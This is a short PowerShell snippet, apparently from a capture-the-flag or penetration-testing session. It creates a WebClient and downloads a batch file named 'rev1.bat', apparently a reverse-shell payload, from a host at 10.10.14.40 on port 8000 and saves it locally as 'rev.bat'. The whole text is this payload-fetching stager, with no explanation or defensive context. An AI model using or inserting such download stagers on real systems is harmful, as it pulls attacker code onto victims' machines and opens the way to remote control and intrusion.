$webclient = New-Object System.Net.WebClient 
$url = "http://10.10.14.40:8000/rev1.bat" 
$file = "rev.bat" 
$webclient.DownloadFile($url,$file) 

